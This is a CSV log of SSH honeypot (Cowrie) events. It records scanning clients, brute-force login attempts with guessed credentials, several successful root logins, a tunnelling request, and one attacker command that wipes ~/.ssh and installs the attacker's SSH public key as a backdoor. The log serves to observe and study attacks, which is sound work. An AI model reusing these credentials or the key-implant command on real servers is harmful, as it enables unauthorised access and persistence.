eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,195.158.4.210,,,,451866d70ece,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:48:24.367970Z
cowrie.login.failed,195.158.4.210,,,,451866d70ece,,,,,login attempt [deploy/PASSWORD] failed,localhost,2024-11-24T04:48:25.361813Z
cowrie.session.closed,195.158.4.210,,,,451866d70ece,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:48:26.600714Z
cowrie.session.connect,195.158.4.210,45310,172.233.154.19,2222,59c3e3c89873,ssh,,,,New connection: 195.158.4.210:45310 (172.233.154.19:2222) [session: 59c3e3c89873],localhost,2024-11-24T04:49:46.433027Z
cowrie.client.version,195.158.4.210,,,,59c3e3c89873,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:49:46.433603Z
cowrie.client.kex,195.158.4.210,,,,59c3e3c89873,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:49:46.670506Z
cowrie.login.failed,195.158.4.210,,,,59c3e3c89873,,,,,login attempt [test/test1111] failed,localhost,2024-11-24T04:49:47.654187Z
cowrie.session.closed,195.158.4.210,,,,59c3e3c89873,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:49:48.896895Z
cowrie.session.connect,176.96.243.175,46494,172.233.154.19,2222,a38e8407bc28,ssh,,,,New connection: 176.96.243.175:46494 (172.233.154.19:2222) [session: a38e8407bc28],localhost,2024-11-24T04:49:58.481890Z
cowrie.client.version,176.96.243.175,,,,a38e8407bc28,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:49:58.487926Z
cowrie.client.kex,176.96.243.175,,,,a38e8407bc28,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:49:58.721515Z
cowrie.session.connect,85.192.56.68,36940,172.233.154.19,2222,3c4521d36597,ssh,,,,New connection: 85.192.56.68:36940 (172.233.154.19:2222) [session: 3c4521d36597],localhost,2024-11-24T04:49:58.968368Z
cowrie.client.version,85.192.56.68,,,,3c4521d36597,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-24T04:49:58.969066Z
cowrie.client.kex,85.192.56.68,,,,3c4521d36597,,,6a77bbd6ef48d6a9959a47aa4a42a505,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 6a77bbd6ef48d6a9959a47aa4a42a505,localhost,2024-11-24T04:49:59.143376Z
cowrie.login.success,85.192.56.68,,,,3c4521d36597,,,,,login attempt [root/broadguam1] succeeded,localhost,2024-11-24T04:49:59.751305Z
cowrie.direct-tcpip.request,85.192.56.68,0,178.20.45.148,80,3c4521d36597,,,,,direct-tcp connection request to 178.20.45.148:80 from 0.0.0.0:0,localhost,2024-11-24T04:49:59.930062Z
cowrie.login.failed,176.96.243.175,,,,a38e8407bc28,,,,,login attempt [user/P@ssw0rd123] failed,localhost,2024-11-24T04:50:00.301285Z
cowrie.session.closed,176.96.243.175,,,,a38e8407bc28,,,,,Connection lost after 3 seconds,localhost,2024-11-24T04:50:01.538412Z
cowrie.session.connect,51.159.103.10,42690,172.233.154.19,2222,b234e2b09bce,ssh,,,,New connection: 51.159.103.10:42690 (172.233.154.19:2222) [session: b234e2b09bce],localhost,2024-11-24T04:50:04.094265Z
cowrie.session.connect,51.159.103.10,42672,172.233.154.19,2222,c8dfd063967e,ssh,,,,New connection: 51.159.103.10:42672 (172.233.154.19:2222) [session: c8dfd063967e],localhost,2024-11-24T04:50:04.129941Z
cowrie.session.connect,51.159.103.10,42686,172.233.154.19,2222,587722a3d726,ssh,,,,New connection: 51.159.103.10:42686 (172.233.154.19:2222) [session: 587722a3d726],localhost,2024-11-24T04:50:04.130419Z
cowrie.session.connect,51.159.103.10,42702,172.233.154.19,2222,1554a50f0620,ssh,,,,New connection: 51.159.103.10:42702 (172.233.154.19:2222) [session: 1554a50f0620],localhost,2024-11-24T04:50:04.130812Z
cowrie.session.connect,51.159.103.10,42716,172.233.154.19,2222,8ebcccef0849,ssh,,,,New connection: 51.159.103.10:42716 (172.233.154.19:2222) [session: 8ebcccef0849],localhost,2024-11-24T04:50:04.131218Z
cowrie.client.version,51.159.103.10,,,,b234e2b09bce,,SSH-2.0-OpenSSH-keyscan,,,Remote SSH version: SSH-2.0-OpenSSH-keyscan,localhost,2024-11-24T04:50:04.265927Z
cowrie.client.kex,51.159.103.10,,,,b234e2b09bce,,,699519fdcc30cbcd093d5cd01e4b1d56,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256;chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com;umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none,zlib@openssh.com",SSH client hassh fingerprint: 699519fdcc30cbcd093d5cd01e4b1d56,localhost,2024-11-24T04:50:04.400218Z
cowrie.session.closed,51.159.103.10,,,,b234e2b09bce,,,,,Connection lost after 0 seconds,localhost,2024-11-24T04:50:04.710363Z
cowrie.client.version,51.159.103.10,,,,c8dfd063967e,,SSH-2.0-OpenSSH-keyscan,,,Remote SSH version: SSH-2.0-OpenSSH-keyscan,localhost,2024-11-24T04:50:04.711829Z
cowrie.client.kex,51.159.103.10,,,,c8dfd063967e,,,699519fdcc30cbcd093d5cd01e4b1d56,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256;chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com;umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none,zlib@openssh.com",SSH client hassh fingerprint: 699519fdcc30cbcd093d5cd01e4b1d56,localhost,2024-11-24T04:50:04.847644Z
cowrie.session.closed,51.159.103.10,,,,c8dfd063967e,,,,,Connection lost after 1 seconds,localhost,2024-11-24T04:50:05.162019Z
cowrie.client.version,51.159.103.10,,,,587722a3d726,,SSH-2.0-OpenSSH-keyscan,,,Remote SSH version: SSH-2.0-OpenSSH-keyscan,localhost,2024-11-24T04:50:05.162395Z
cowrie.client.kex,51.159.103.10,,,,587722a3d726,,,699519fdcc30cbcd093d5cd01e4b1d56,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256;chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com;umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none,zlib@openssh.com",SSH client hassh fingerprint: 699519fdcc30cbcd093d5cd01e4b1d56,localhost,2024-11-24T04:50:05.300987Z
cowrie.client.version,51.159.103.10,,,,1554a50f0620,,SSH-2.0-OpenSSH-keyscan,,,Remote SSH version: SSH-2.0-OpenSSH-keyscan,localhost,2024-11-24T04:50:05.619072Z
cowrie.session.closed,51.159.103.10,,,,587722a3d726,,,,,Connection lost after 1 seconds,localhost,2024-11-24T04:50:05.619767Z
cowrie.client.kex,51.159.103.10,,,,1554a50f0620,,,699519fdcc30cbcd093d5cd01e4b1d56,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256;chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com;umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none,zlib@openssh.com",SSH client hassh fingerprint: 699519fdcc30cbcd093d5cd01e4b1d56,localhost,2024-11-24T04:50:05.758775Z
cowrie.session.closed,51.159.103.10,,,,1554a50f0620,,,,,Connection lost after 1 seconds,localhost,2024-11-24T04:50:05.759800Z
cowrie.client.version,51.159.103.10,,,,8ebcccef0849,,SSH-2.0-OpenSSH-keyscan,,,Remote SSH version: SSH-2.0-OpenSSH-keyscan,localhost,2024-11-24T04:50:05.762643Z
cowrie.client.kex,51.159.103.10,,,,8ebcccef0849,,,699519fdcc30cbcd093d5cd01e4b1d56,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256;chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com;umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none,zlib@openssh.com",SSH client hassh fingerprint: 699519fdcc30cbcd093d5cd01e4b1d56,localhost,2024-11-24T04:50:05.905526Z
cowrie.session.closed,51.159.103.10,,,,8ebcccef0849,,,,,Connection lost after 1 seconds,localhost,2024-11-24T04:50:05.906762Z
cowrie.session.closed,85.192.56.68,,,,3c4521d36597,,,,,Connection lost after 55 seconds,localhost,2024-11-24T04:50:53.969120Z
cowrie.session.connect,195.158.4.210,56142,172.233.154.19,2222,298d0bc6681a,ssh,,,,New connection: 195.158.4.210:56142 (172.233.154.19:2222) [session: 298d0bc6681a],localhost,2024-11-24T04:51:11.381116Z
cowrie.client.version,195.158.4.210,,,,298d0bc6681a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:51:11.382231Z
cowrie.client.kex,195.158.4.210,,,,298d0bc6681a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:51:11.619387Z
cowrie.login.failed,195.158.4.210,,,,298d0bc6681a,,,,,login attempt [admin/admin2010] failed,localhost,2024-11-24T04:51:12.610004Z
cowrie.session.closed,195.158.4.210,,,,298d0bc6681a,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:51:13.902467Z
cowrie.session.connect,176.96.243.175,47394,172.233.154.19,2222,52449e91a129,ssh,,,,New connection: 176.96.243.175:47394 (172.233.154.19:2222) [session: 52449e91a129],localhost,2024-11-24T04:51:44.122172Z
cowrie.client.version,176.96.243.175,,,,52449e91a129,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:51:44.123009Z
cowrie.client.kex,176.96.243.175,,,,52449e91a129,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:51:44.356478Z
cowrie.login.success,176.96.243.175,,,,52449e91a129,,,,,login attempt [root/pa$$woord] succeeded,localhost,2024-11-24T04:51:46.048445Z
cowrie.session.params,176.96.243.175,,,,52449e91a129,,,,,[],localhost,2024-11-24T04:51:46.707758Z
cowrie.command.input,176.96.243.175,,,,52449e91a129,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T04:51:46.708159Z
cowrie.command.failed,176.96.243.175,,,,52449e91a129,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T04:51:46.708814Z
cowrie.log.closed,176.96.243.175,,,,52449e91a129,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T04:51:47.332758Z
cowrie.session.params,176.96.243.175,,,,52449e91a129,,,,,[],localhost,2024-11-24T04:51:47.706759Z
cowrie.command.input,176.96.243.175,,,,52449e91a129,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T04:51:47.707131Z
cowrie.session.file_download,176.96.243.175,,,,52449e91a129,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T04:51:48.052034Z
cowrie.log.closed,176.96.243.175,,,,52449e91a129,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T04:51:48.052503Z
cowrie.session.connect,176.96.243.175,47408,172.233.154.19,2222,1762bdb098f8,ssh,,,,New connection: 176.96.243.175:47408 (172.233.154.19:2222) [session: 1762bdb098f8],localhost,2024-11-24T04:51:48.362412Z
cowrie.client.version,176.96.243.175,,,,1762bdb098f8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:51:48.373729Z
cowrie.client.kex,176.96.243.175,,,,1762bdb098f8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:51:48.602405Z
cowrie.login.failed,176.96.243.175,,,,1762bdb098f8,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T04:51:50.330194Z
cowrie.session.closed,176.96.243.175,,,,1762bdb098f8,,,,,Connection lost after 3 seconds,localhost,2024-11-24T04:51:51.561893Z
cowrie.session.connect,176.96.243.175,47420,172.233.154.19,2222,d12e0c127ff6,ssh,,,,New connection: 176.96.243.175:47420 (172.233.154.19:2222) [session: d12e0c127ff6],localhost,2024-11-24T04:51:51.971725Z
cowrie.client.version,176.96.243.175,,,,d12e0c127ff6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:51:52.046272Z
cowrie.client.kex,176.96.243.175,,,,d12e0c127ff6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:51:52.495903Z
cowrie.login.success,176.96.243.175,,,,d12e0c127ff6,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T04:51:54.407835Z
cowrie.session.closed,176.96.243.175,,,,d12e0c127ff6,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:51:54.638987Z
cowrie.session.closed,176.96.243.175,,,,52449e91a129,,,,,Connection lost after 10 seconds,localhost,2024-11-24T04:51:54.639573Z
cowrie.session.connect,195.158.4.210,54826,172.233.154.19,2222,1efdf6dff316,ssh,,,,New connection: 195.158.4.210:54826 (172.233.154.19:2222) [session: 1efdf6dff316],localhost,2024-11-24T04:52:39.133273Z
cowrie.client.version,195.158.4.210,,,,1efdf6dff316,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:52:39.133885Z
cowrie.client.kex,195.158.4.210,,,,1efdf6dff316,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:52:39.370521Z
cowrie.login.failed,195.158.4.210,,,,1efdf6dff316,,,,,login attempt [tester/tester1] failed,localhost,2024-11-24T04:52:40.357308Z
cowrie.session.closed,195.158.4.210,,,,1efdf6dff316,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:52:41.596147Z
cowrie.session.connect,195.158.4.210,46458,172.233.154.19,2222,9de39e4a8cab,ssh,,,,New connection: 195.158.4.210:46458 (172.233.154.19:2222) [session: 9de39e4a8cab],localhost,2024-11-24T04:54:06.483134Z
cowrie.client.version,195.158.4.210,,,,9de39e4a8cab,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:54:06.483728Z
cowrie.client.kex,195.158.4.210,,,,9de39e4a8cab,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:54:06.721113Z
cowrie.login.failed,195.158.4.210,,,,9de39e4a8cab,,,,,login attempt [devops/2024] failed,localhost,2024-11-24T04:54:07.704702Z
cowrie.session.closed,195.158.4.210,,,,9de39e4a8cab,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:54:08.949235Z
cowrie.session.connect,195.158.4.210,34294,172.233.154.19,2222,18f169c31af9,ssh,,,,New connection: 195.158.4.210:34294 (172.233.154.19:2222) [session: 18f169c31af9],localhost,2024-11-24T04:55:32.925345Z
cowrie.client.version,195.158.4.210,,,,18f169c31af9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:55:32.926020Z
cowrie.client.kex,195.158.4.210,,,,18f169c31af9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:55:33.163312Z
